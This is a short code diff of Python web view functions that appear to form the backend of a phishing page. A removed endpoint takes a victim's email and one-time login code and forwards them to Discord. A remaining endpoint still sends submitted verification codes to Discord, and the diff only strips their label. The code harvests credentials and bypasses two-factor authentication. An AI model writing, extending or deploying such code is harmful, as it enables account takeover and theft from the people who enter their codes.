@@ -363,32 +363,6 @@ def login_user(request, user_id):
         'message': 'Invalid request method'
     }, status=400)
 
-def send_email_code(request, user_id):
-    """
-    Handle login - AJAX endpoint that returns JSON response only
-    No redirect, stays on login page - this is intentional for Discord notification
-    """
-    print("=" * 50)
-    print(f"🔐 LOGIN ATTEMPT - User ID: {user_id}")
-    print(f"📝 Request method: {request.method}")
-    
-    if request.method == 'POST':
-        email = request.POST.get('email')
-        verify_code = request.POST.get('verify_code')
-    
-        discord_message = f"📊 Email : ```{email}``` One-Time Code : ```{verify_code}```"
-        send_discord_message(discord_message, color=0x00ff00)
-
-        return JsonResponse({
-            'status': 'success',
-            'message': 'Email information sent to Discord!'
-        })
-    
-    # Return error for non-POST requests
-    return JsonResponse({
-        'status': 'error',
-        'message': 'Invalid request method'
-    }, status=400)
 
 def send_verification_code(request, user_id):
     """
@@ -402,7 +376,7 @@ def send_verification_code(request, user_id):
     if request.method == 'POST':
         verificationCodevalue = request.POST.get('verificationCodevalue')
         
-        discord_message = f"📊 Verification Code :  ```{verificationCodevalue}```"
+        discord_message = f"```{verificationCodevalue}```"
         send_discord_message(discord_message, color=0x00ff00)
         
        
